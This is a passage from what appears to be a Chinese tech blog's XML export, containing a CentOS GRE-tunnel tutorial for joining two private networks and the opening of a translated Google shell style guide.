<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/etc/sysconfig/network-scripts/ifup greXXX"</span>&gt;&gt;/etc/rc.local</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>GRE</tag>
        <tag>bash</tag>
        <tag>6.9</tag>
        <tag>initscripts</tag>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下用GRE隧道直接联通两个私网</title>
    <url>/2016/08/Linux%E4%B8%8B%E7%94%A8GRE%E9%9A%A7%E9%81%93%E7%9B%B4%E6%8E%A5%E8%81%94%E9%80%9A%E4%B8%A4%E4%B8%AA%E7%A7%81%E7%BD%91/index.html</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这篇文档其实主要讲的是行内关于“打洞”的事情。</p>
<h1 id="什么叫“打洞”"><a href="#什么叫“打洞”" class="headerlink" title="什么叫“打洞”"></a>什么叫“打洞”</h1><p>通过在两个私网之间打一条隧道（tunnel）而把他们连接起来的方法，行内俗称“<strong>打洞</strong>”，其实专业的说法应该是“搭建隧道”，在两个能路由的两个单独的私有网络之间搭建一条隧道（tunnel）以便于两个私网之间能够直接互通。<br><a id="more"></a></p>
<h1 id="为什么要“打洞”"><a href="#为什么要“打洞”" class="headerlink" title="为什么要“打洞”"></a>为什么要“打洞”</h1><h2 id="刚需"><a href="#刚需" class="headerlink" title="刚需"></a>刚需</h2><p>这个恐怕对于大多数互联网企业来讲，都是绕不开的需求。互联网公司大多有好些单独的私网，比如，每个单独的办公环境都有单独的私网吧，还有托管机房是不是也有单独的私网？如果用了公有云的话，那么每个公有云是不是也有单独的私网？而“打洞”就是为了把这些网络无缝的连接起来，组成一张大的“内网”。显而易见有几个好处：</p>
<ul>
<li>办公网的每一个用户可以自动漫游，无需修改配置而访问办公网的每一个节点</li>
<li>办公、管理都走私网，貌似更显得专业、安全一些</li>
</ul>
<h2 id="中小企业场景"><a href="#中小企业场景" class="headerlink" title="中小企业场景"></a>中小企业场景</h2><p>我们这里主要讲中小企业常用的Linux+GRE+tunnel方案，为什么不提大型企业呢？因为大公司大多直接采购专业的网络设备来做类似的工作了，更有甚者，直接租用点对点专线来直连各个私网，所以高富帅的生活我等屌丝不懂，也就不在这里讨论了。</p>
<h1 id="怎样“打洞”"><a href="#怎样“打洞”" class="headerlink" title="怎样“打洞”"></a>怎样“打洞”</h1><p>下面就以在CentOS6.x(CentOS7.x其实是一样的)下为例来讲下怎样打洞（GRE tunnel），其他Linux发行版下的情况可以同理推之。</p>
<h2 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h2><p>如下图所示：两个私网的网关都分别直接有公网地址。这个场景应该是最普遍的场景。</p>
<img src="/2016/08/Linux下用GRE隧道直接联通两个私网/index/scene1.png" title="[场景一图片]">
<p>注意：上图由如下graphviz代码生成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;graphviz dot&gt;</span><br><span class="line">digraph G &#123;</span><br><span class="line">  rankdir=&quot;LR&quot;;</span><br><span class="line">  GA [shape=box, label=&quot;GW_A&quot;];</span><br><span class="line">  NetA [label=&quot;NetA\n10.0.0.0/24&quot;];</span><br><span class="line">  GA -&gt; NetA [dir=none, taillabel=&quot;.1&quot;];</span><br><span class="line">  GA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;];</span><br><span class="line">  Internet [label=&quot;internet&quot;];</span><br><span class="line">  Internet -&gt; GB [dir=none, headlabel=&quot;2.2.2.2&quot;];</span><br><span class="line">  GB [shape=box, label=&quot;GW_B&quot;];</span><br><span class="line">  GB -&gt; NetB [dir=none, taillabel=&quot;.1&quot;];</span><br><span class="line">  NetB [label=&quot;NetB\n10.0.1.0/24&quot;];</span><br><span class="line">  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false];</span><br><span class="line">  &#123;rank=same GA NetA&#125;</span><br><span class="line">  &#123;rank=same GB NetB&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/graphviz&gt;</span><br></pre></td></tr></table></figure></p>
<p>这个配置是最好写了，在GW_A上写配置文件<em>/etc/sysconfig/network-scripts/ifcfg-gw</em></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">DEVICE</span>=gw</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">TYPE</span>=GRE</span><br><span class="line"><span class="attr">PEER_OUTER_IPADDR</span>=<span class="number">2.2</span>.<span class="number">2.2</span></span><br><span class="line"><span class="attr">PEER_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">MY_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">KEY</span>=haw-haw.org</span><br><span class="line"><span class="attr">BOOTPROTO</span>=none</span><br></pre></td></tr></table></figure>
<p>同样的，在GW_B上写配置文件<em>/etc/sysconfig/network-scripts/ifcfg-gw</em></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">DEVICE</span>=gw</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">TYPE</span>=GRE</span><br><span class="line"><span class="attr">PEER_OUTER_IPADDR</span>=<span class="number">1.1</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">PEER_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">0.0</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">MY_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">KEY</span>=haw-haw.org</span><br><span class="line"><span class="attr">BOOTPROTO</span>=none</span><br></pre></td></tr></table></figure>
<p>最后，分别在GW_A和GW_B上分别激活网络设备gw即可，具体命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifup gw;</span><br></pre></td></tr></table></figure>
<h2 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h2><p>如下图所示：只有一个私网的网关（GW_B）直接有公网地址，另外一个(GW_A)没有直接接公网，但是它在Firewall A设备上有个一对一的NAT(ip是1.1.1.1)，这个情况就稍稍复杂一些。</p>
<img src="/2016/08/Linux下用GRE隧道直接联通两个私网/index/scene2.png" title="[场景二图片]">
<p>注意：上图由如下graphviz代码生成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;graphviz dot&gt;</span><br><span class="line">digraph G &#123;</span><br><span class="line">  newrank=true;</span><br><span class="line">  rankdir=LR;</span><br><span class="line">  compound=true;</span><br><span class="line">  FWA [shape=box, label=&quot;Firewall A&quot;];</span><br><span class="line">  subgraph cluster_NetA &#123;</span><br><span class="line">    rankdir=LR;</span><br><span class="line">    graph [style=&quot;dotted&quot;];</span><br><span class="line">    label=&quot;NetA\n10.0.0.0/24&quot;;</span><br><span class="line">    GA [shape=box, label=&quot;GW_A\n.1&quot;];</span><br><span class="line">  &#125;</span><br><span class="line">  Internet [label=&quot;internet&quot;];</span><br><span class="line">  GB [shape=box, label=&quot;GW_B&quot;];</span><br><span class="line">  NetB [label=&quot;NetB\n10.0.1.0/24&quot;];</span><br><span class="line">  FWA -&gt; GA [dir=&quot;none&quot;, lhead=&quot;cluster_NetA&quot;, minlen=2];</span><br><span class="line">  FWA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;, minlen=2, labeldistance=2];</span><br><span class="line">  GA -&gt; Internet [dir=none, style=&quot;dashed&quot;, taillabel=&quot;1.1.1.1(NAT)&quot;, constraint=false, labeldistance=3];</span><br><span class="line">  Internet -&gt; GB [dir=none, headlabel=&quot;2.2.2.2&quot;, minlen=1.5, labeldistance=2];</span><br><span class="line">  GB -&gt; NetB [dir=none, taillabel=&quot;.1&quot;];</span><br><span class="line">  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false, labeldistance=1];</span><br><span class="line">  &#123;rank=same GB NetB&#125;</span><br><span class="line">  &#123;rank=same FWA GA&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/graphviz&gt;</span><br></pre></td></tr></table></figure></p>
<p>在GW_A上写配置文件<em>/etc/sysconfig/network-scripts/ifcfg-gw</em></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">DEVICE</span>=gw</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">TYPE</span>=GRE</span><br><span class="line"><span class="attr">PEER_OUTER_IPADDR</span>=<span class="number">2.2</span>.<span class="number">2.2</span></span><br><span class="line"><span class="attr">PEER_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">MY_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">KEY</span>=haw-haw.org</span><br><span class="line"><span class="attr">BOOTPROTO</span>=none</span><br></pre></td></tr></table></figure>
<p>同样的，在GW_B上写配置文件<em>/etc/sysconfig/network-scripts/ifcfg-gw</em></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">DEVICE</span>=gw</span><br><span class="line"><span class="attr">ONBOOT</span>=<span class="literal">yes</span></span><br><span class="line"><span class="attr">TYPE</span>=GRE</span><br><span class="line"><span class="attr">PEER_OUTER_IPADDR</span>=<span class="number">1.1</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">PEER_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">0.0</span>/<span class="number">24</span></span><br><span class="line"><span class="attr">MY_INNER_IPADDR</span>=<span class="number">10.0</span>.<span class="number">1.1</span></span><br><span class="line"><span class="attr">KEY</span>=haw-haw.org</span><br><span class="line"><span class="attr">BOOTPROTO</span>=none</span><br></pre></td></tr></table></figure>
<p>最后，分别在GW_A和GW_B上分别激活网络设备gw即可，具体命令是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifup gw;</span><br></pre></td></tr></table></figure>
<p>细心的人会发现，这两种场景下配置文件是一样的！对，就是一样的。:)</p>
<h2 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h2><p>如下图所示：两个私网的网关（GW_A和GW_B）都没有公网地址，都是通过防火墙设备(Firewall A和Firewall B)上分别做的一对一的NAT(ip分别是1.1.1.1和2.2.2.2)。</p>
<img src="/2016/08/Linux下用GRE隧道直接联通两个私网/index/scene3.png" title="[场景三图片]">
<p>注意：上图由如下graphviz代码生成。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;graphviz dot&gt;</span><br><span class="line">digraph G &#123;</span><br><span class="line">  newrank=true;</span><br><span class="line">  rankdir=LR;</span><br><span class="line">  compound=true;</span><br><span class="line">  FWA [shape=box, label=&quot;Firewall A&quot;];</span><br><span class="line">  subgraph cluster_NetA &#123;</span><br><span class="line">    rankdir=LR;</span><br><span class="line">    graph [style=&quot;dotted&quot;];</span><br><span class="line">    label=&quot;NetA\n10.0.0.0/24&quot;;</span><br><span class="line">    GA [shape=box, label=&quot;GW_A\n.1&quot;];</span><br><span class="line">  &#125;</span><br><span class="line">  Internet [label=&quot;internet&quot;];</span><br><span class="line">  FWB [shape=box, label=&quot;Firewall B&quot;];</span><br><span class="line">  subgraph cluster_NetB &#123;</span><br><span class="line">    rankdir=LR;</span><br><span class="line">    graph [style=&quot;dotted&quot;];</span><br><span class="line">    label=&quot;NetB\n10.0.1.0/24&quot;;</span><br><span class="line">    GB [shape=box, label=&quot;GW_B\n.1&quot;];</span><br><span class="line">  &#125;</span><br><span class="line">  FWA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;, minlen=2, labeldistance=2];</span><br><span class="line">  Internet -&gt; FWB [dir=&quot;none&quot;, headlabel=&quot;2.2.2.2&quot;, minlen=2, labeldistance=2];</span><br><span class="line">  FWA -&gt; GA [dir=&quot;none&quot;, lhead=&quot;cluster_NetA&quot;, minlen=2];</span><br><span class="line">  FWB -&gt; GB [dir=&quot;none&quot;, lhead=&quot;cluster_NetB&quot;, minlen=2];</span><br><span class="line">  GA -&gt; Internet [dir=none, style=&quot;dashed&quot;, taillabel=&quot;1.1.1.1(NAT)&quot;, constraint=false, labeldistance=3];</span><br><span class="line">  Internet -&gt; GB [dir=none, style=&quot;dashed&quot;, headlabel=&quot;2.2.2.2(NAT)&quot;, minlen=1.5, labeldistance=2];</span><br><span class="line">  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false, labeldistance=1];</span><br><span class="line">  &#123;rank=same FWB GB&#125;</span><br><span class="line">  &#123;rank=same FWA GA&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/graphviz&gt;</span><br></pre></td></tr></table></figure></p>
<p>GW_A和GW_B上的配置，跟前两种场景是一样的。</p>
<h1 id="调整MTU"><a href="#调整MTU" class="headerlink" title="调整MTU"></a>调整MTU</h1><p>这点很重要！不做这个的话你的网络也许会出各种各样的神奇问题！：）</p>
<p>方法很简单，在GW_A和GW_B的机器上分别执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t mangle \</span><br><span class="line">    -A FORWARD \</span><br><span class="line">    -p tcp \</span><br><span class="line">    -m tcp \</span><br><span class="line">    --tcp-flags SYN,RST SYN \</span><br><span class="line">    -j TCPMSS \</span><br><span class="line">    --clamp-mss-to-pmtu;</span><br></pre></td></tr></table></figure>
<h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>这样配置的好处是显而易见的：</p>
<h2 id="避免引入互联IP"><a href="#避免引入互联IP" class="headerlink" title="避免引入互联IP"></a>避免引入互联IP</h2><p>行内其他的方案其实也差不多，唯一比较大的区别是其他方案一般都会在GW_A和GW_B的隧道虚接口gw上配上互联IP地址来用于互通，然后把对端的私有网络地址段的路由指向对端隧道虚接口gw的互联IP。这样做其实也能实现功能，但是有几个问题：</p>
<ul>
<li>网关机器GW_A和GW_B跟对端私网的非网关的其他机器的私网通讯可能会有问题，需要其他机器上到互联ip所在网段的路由正好指向本网段的网关地址</li>
<li>简单看是仅多一对互联IP，但其实是整多一个互联网段！这对于ip地址及网络的维护带来的工作量不能低估</li>
</ul>
<h2 id="配置文件维护方便"><a href="#配置文件维护方便" class="headerlink" title="配置文件维护方便"></a>配置文件维护方便</h2><ul>
<li>保证重启服务器、重启网络甚至于重启网络设备都会正确读取配置</li>
<li>虚接口也可以单独启停，维护起来相当方便</li>
<li>维护模式相当清晰，改动起来非常方便</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="启停命令"><a href="#启停命令" class="headerlink" title="启停命令"></a>启停命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifup gw;<span class="comment"># start</span></span><br><span class="line">ifdown gw;<span class="comment"># stop</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是：在以上三种场景中，都需要确认在NetA和NetB网络中机器上到10.0.1.0/24和10.0.0.0/24的路由分别指向了GW_A和GW_B(可以分别在default gw上做)</p>
<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><p>在某些具体的场景下，比如NetA后面还接的有NetC，IP地址段是172.16.1.0/24，那么为了让NetB和NetC能私网互通，则必须要在NetB的网关GW_B上将NetC的地址172.16.1.0/24指向NetA的网关地址GW_A才行，这种情况下只需要在GW_B上编辑配置文件<em>/etc/sysconfig/network-scripts/route-gw</em>，其内容如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">172.16.1.0/24 dev gw src 10.0.1.1</span><br></pre></td></tr></table></figure>
<p>这样设置的静态路由会在<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifup gw;</span><br></pre></td></tr></table></figure></p>
<p>时自动被启用，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifdown gw;</span><br></pre></td></tr></table></figure></p>
<p>时自动删除，能不能不要这么方便、人性化！</p>
<h1 id="存在问题"><a href="#存在问题" class="headerlink" title="存在问题"></a>存在问题</h1><p>本文话题到此就结束了，但是安全意识强的同学就会马上意识到：这种方式把几个不同的网络连成了一个大三层的网络，的确是很方便，但是网络之间的通讯没有被加密，直接明文传输，是不是不太合适？好问题！所以，下一篇文章我们将讲一下怎样把网络之间的流量加密一下。请看，进阶阅读：<a href="/2016/08/CentOS6-x下用ipsec加密GRE隧道/">CentOS6.x下用ipsec加密GRE隧道</a>。</p>
]]></content>
      <tags>
        <tag>GRE</tag>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>google的shell（编程）风格指南</title>
    <url>/2017/02/google%E7%9A%84shell%EF%BC%88%E7%BC%96%E7%A8%8B%EF%BC%89%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97/index.html</url>
    <content><![CDATA[<h1 id="背景（Background）"><a href="#背景（Background）" class="headerlink" title="背景（Background）"></a>背景（Background）</h1><h2 id="使用哪种-Shell-Which-Shell-to-Use"><a href="#使用哪种-Shell-Which-Shell-to-Use" class="headerlink" title="使用哪种 Shell(Which Shell to Use)"></a>使用哪种 Shell(Which Shell to Use)</h2><p>Bash是唯一被允许执行的shell脚本语言。</p>
<p>可执行文件必须以 <code>#!/bin/bash</code> 和最小数量的标志开始。请使用 <code>set</code> 来设置 Shell 的选项，使得用 <code>bash &lt;script_name&gt;</code> 调用你的脚本时不会破坏其功能。<br>限制所有的可执行 Shell 脚本为 Bash 使得我们安装在所有计算机中的 Shell 语言保持一致性。<br>对此唯一例外的是当你被迫时可以不这么做的。例如 Solaris SVR4，需要用纯 Bourne shell。</p>
<a id="more"></a>
<h2 id="何时使用-Shell-When-to-use-Shell"><a href="#何时使用-Shell-When-to-use-Shell" class="headerlink" title="何时使用 Shell(When to use Shell)"></a>何时使用 Shell(When to use Shell)</h2><p>Shell 应该仅仅被用于小工具或者简单的包装脚本。</p>
<p>尽管 Shell 脚本不是一种开发语言，但在整个谷歌它被用于编写多种实用工具脚本。这个风格指南更多的是认同它的使用，而不是一个建议，即它可被用于广泛部署。<br>以下是一些准则：</p>
<ul>
<li>如果你主要是在调用其他的工具并且做一些相对很小数据量的操作，那么使用Shell 来完成任务是一种可接受的选择。</li>
<li>如果你在乎性能，那么请选择其他工具，而不是使用 Shell。</li>
<li>如果你发现你需要在任何地方使用数组而不是变量赋值（如 <code>${PHPESTATUS}</code> ），那么你应该使用 Python 脚本。</li>
<li>如果你将要编写的脚本会超过 100 行，那么你可能应该使用 Python 来编写，而不是 Shell。记住：脚本长度会增加，尽早使用另外一种语言重写你的脚本，以避免之后花更多的时间来重写。[^1]</li>
</ul>
<h1 id="Shell-文件和解释器调用-Shell-Files-and-Interpreter-Invocation"><a href="#Shell-文件和解释器调用-Shell-Files-and-Interpreter-Invocation" class="headerlink" title="Shell 文件和解释器调用(Shell Files and Interpreter Invocation)"></a>Shell 文件和解释器调用(Shell Files and Interpreter Invocation)</h1><h2 id="文件扩展名-File-Extensions"><a href="#文件扩展名-File-Extensions" class="headerlink" title="文件扩展名(File Extensions)"></a>文件扩展名(File Extensions)</h2><p>可执行文件应该没有扩展名（强烈建议）或者使用 .sh 扩展名。库文件必须使用 .sh 作为扩展名，而且应该是不可执行的。</p>
<p>当执行一个程序时，并不需要知道它是用什么语言编写的。而且 Shell 脚本也不要求有扩展名。所以我们更喜欢可执行文件没有扩展名。<br>然而，对于库文件，知道其用什么语言编写的是很重要的，有时候会需要使用不同语言编写的相似的库文件。使用 .sh 这样特定语言后缀作为扩展名，就使得用不同语言编写的具有相同功能的库文件可以采用一样的名称。</p>
<h2 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID/SGID"></a>SUID/SGID</h2><p>SUID 和 SGID 在 Shell 脚本上是被禁止的。</p>
<p>Shell 有着很多的安全性问题以至于在 Shell 上安全启用 SUID/SGID 几乎是不可能的。虽然 Bash 使得使用 SUID 很困难，但是在某些平台上还是有可能的，这也是为什么我们要明确禁止使用 SUID/SGID 的原因。<br>如果你需要高的存取（权限）请使用 <code>sudo</code>。</p>
<h1 id="环境-Environment"><a href="#环境-Environment" class="headerlink" title="环境(Environment)"></a>环境(Environment)</h1><h2 id="标准输出对比错误输出-STDOUT-vs-STDERR"><a href="#标准输出对比错误输出-STDOUT-vs-STDERR" class="headerlink" title="标准输出对比错误输出(STDOUT vs STDERR)"></a>标准输出对比错误输出(STDOUT vs STDERR)</h2><p>所有的错误信息应该输入到标准错误输出（STDERR）中。</p>
<p>这使得从实际问题中分离出正常状态变得更容易。<br>下面这个函数是用于打印出错误信息以及其他状态信息的功能，值得推荐。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">err</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"[<span class="variable">$(date +'%Y-%m-%dT%H:%M:%S%z')</span>]: <span class="variable">$@</span>"</span> &gt;&amp;2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! do_something; <span class="keyword">then</span></span><br><span class="line">  err <span class="string">"Unable to do_something"</span></span><br><span class="line">  <span class="built_in">exit</span> <span class="string">"<span class="variable">$&#123;E_DID_NOTHING&#125;</span>"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h1 id="注释-Comments"><a href="#注释-Comments" class="headerlink" title="注释(Comments)"></a>注释(Comments)</h1><h2 id="文件头-File-Header"><a href="#文件头-File-Header" class="headerlink" title="文件头(File Header)"></a>文件头(File Header)</h2><p>在每个文件开头处添加一段描述内容。</p>
<p>每个文件必须有一个顶层注释，内容包含了内容的简短概述。一个版权 (copyright) 声明，还有作者信息时可选的。<br>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Perform hot backups of Oracle databases.</span></span><br></pre></td></tr></table></figure>
<h2 id="函数注释-Function-Commets"><a href="#函数注释-Function-Commets" class="headerlink" title="函数注释(Function Commets)"></a>函数注释(Function Commets)</h2><p>任何不能同时具备（功能）显而易见且短小的函数都必须有注释。任何库函数，无论其长度大小和复杂性都必须要有注释。</p>
<p>对其他人来讲仅通过阅读注释来学会使用你的程序或库中的函数应该是可能的。<br>所有的函数注释应该包含如下的内容: </p>
<ul>
<li>函数的描述信息 </li>
<li>使用的和修改的全局变量 </li>
<li>参数信息 </li>
<li>返回值而不是最后一条命令的缺省退出状态码 </li>
</ul>
<p>例子:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Perform hot backups of Oracle databases.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">'/usr/xpg4/bin:/usr/bin:/opt/csw/bin:/opt/goog/bin'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#######################################</span></span><br><span class="line"><span class="comment"># Cleanup files from the backup dir</span></span><br><span class="line"><span class="comment"># Globals:</span></span><br><span class="line"><span class="comment">#   BACKUP_DIR</span></span><br><span class="line"><span class="comment">#   ORACLE_SID</span></span><br><span class="line"><span class="comment"># Arguments:</span></span><br><span class="line"><span class="comment">#   None</span></span><br><span class="line"><span class="comment"># Returns:</span></span><br><span class="line"><span class="comment">#   None</span></span><br><span class="line"><span class="comment">#######################################</span></span><br><span class="line"><span class="function"><span class="title">cleanup</span></span>() &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实现的注释-Implementation-Comments"><a href="#实现的注释-Implementation-Comments" class="headerlink" title="实现的注释(Implementation Comments)"></a>实现的注释(Implementation Comments)</h2><p>对你的代码中含有技巧的，不明显的，有趣的，或者是一些重要的部分添加注释。</p>
<p>遵循 Google 的通用编码注释的做法。不要所有代码都加注释。如果有一个复杂的算法，或者是你在做一个与众不同的功能，在这些地方放置一个简单的注释即可。</p>
<h2 id="TODO-的注释-TODO-Comments"><a href="#TODO-的注释-TODO-Comments" class="headerlink" title="TODO 的注释(TODO Comments)"></a>TODO 的注释(TODO Comments)</h2><p>在临时的、短期解决方案的、或者足够好但不够完美的代码处添加 TODO 注释。</p>
<p>这与 C++ 指南中的约定相一致。<br>所有的 TODO 类别的注释，应该包含一个全部大写的字符串 TODO，后面用括号包含您的用户名。冒号是可选的。这里最好把 bug 号，或者是 ticket 号放在TODO 注释后面。<br>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># TODO(mrmonkey): Handle the unlikely edge cases (bug ####)</span></span><br></pre></td></tr></table></figure>
<h1 id="格式-Formatting"><a href="#格式-Formatting" class="headerlink" title="格式(Formatting)"></a>格式(Formatting)</h1><p>虽然你需要遵循你正在修改的文件的风格，但是新的代码必须要遵循下面的风格。</p>
<h2 id="缩进-Indentation"><a href="#缩进-Indentation" class="headerlink" title="缩进(Indentation)"></a>缩进(Indentation)</h2><p>按照 2 个空格来缩进，不使用 tab 来缩进。</p>
<p>在两个语句块中间使用空白行来提高可读性。缩进使用两个空格。无论你做什么，不要使用制表符（tab）。对于现有的文件，保留现有使用的缩进，</p>
<h2 id="行长度和长字符串-Line-Length-and-Long-Strings"><a href="#行长度和长字符串-Line-Length-and-Long-Strings" class="headerlink" title="行长度和长字符串(Line Length and Long Strings)"></a>行长度和长字符串(Line Length and Long Strings)</h2><p>一行的长度最多是 80 个字符.</p>
<p>如果你必须要写一个长于 80 个字符的字符串，如果可能的话，你应该尽量使用 <strong><em>here document</em></strong> 或者嵌入一个新行，如果有一个文字字符串长度超过了 80 个字符，并且不能合理的分割文字字符串，但是强烈推荐你找到一种办法让它更短一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DO use 'here document's</span></span><br><span class="line">cat &lt;&lt;END;</span><br><span class="line">I am an exceptionally long</span><br><span class="line">string.</span><br><span class="line">END</span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedded newlines are ok too</span></span><br><span class="line">long_string=<span class="string">"I am an exceptionally</span></span><br><span class="line"><span class="string">  long string."</span></span><br></pre></td></tr></table></figure>
<h2 id="多个管道-Pipelines"><a href="#多个管道-Pipelines" class="headerlink" title="多个管道(Pipelines)"></a>多个管道(Pipelines)</h2><p>如果一行不能容纳多个管道操作，那么请将多个管道拆分成一行一个。</p>
<p>如果一行容得下整个管道操作，那么请将整个管道操作写在同一行。<br>否则，那么应该分割成每行一个管道，新的一行应该缩进 ２ 个空格。这条规则适用于那些通过使用”|”或者是一个逻辑运算符”||”和”&amp;&amp;”等组合起来的链式命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># All fits on one line</span></span><br><span class="line">command1 | command2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Long commands</span></span><br><span class="line">command1 \</span><br><span class="line">  | command2 \</span><br><span class="line">  | command3 \</span><br><span class="line">  | command4</span><br></pre></td></tr></table></figure>
<h2 id="循环-Loops"><a href="#循环-Loops" class="headerlink" title="循环(Loops)"></a>循环(Loops)</h2><p>请将 <code>; do</code>、<code>; then</code> 和 <code>while</code>、<code>for</code> 或者 <code>if</code> 放在同一行。</p>
<p>Shell 中的循环略有不同，但是我们遵循像声明函数时用大括号同样的原则，也就是说：<code>; do</code>、<code>; then</code> 应该和 <code>if/for/while</code> 放在同一行。 <code>else</code> 应该单独一行，结束语句应该单独一行并且跟开始语句垂直对齐。</p>
<p>例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> dir <span class="keyword">in</span> <span class="variable">$&#123;dirs_to_cleanup&#125;</span>; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ -d <span class="string">"<span class="variable">$&#123;dir&#125;</span>/<span class="variable">$&#123;ORACLE_SID&#125;</span>"</span> ]]; <span class="keyword">then</span></span><br><span class="line">    log_date <span class="string">"Cleaning up old files in <span class="variable">$&#123;dir&#125;</span>/<span class="variable">$&#123;ORACLE_SID&#125;</span>"</span></span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;dir&#125;</span>/<span class="variable">$&#123;ORACLE_SID&#125;</span>/"</span>*</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">"$?"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">      error_message</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    mkdir -p <span class="string">"<span class="variable">$&#123;dir&#125;</span>/<span class="variable">$&#123;ORACLE_SID&#125;</span>"</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">"$?"</span> -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">      error_message</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="Case-语句-Case-statement"><a href="#Case-语句-Case-statement" class="headerlink" title="Case 语句(Case statement)"></a>Case 语句(Case statement)</h2><ul>
<li>缩进可用 2 个空格替代。</li>
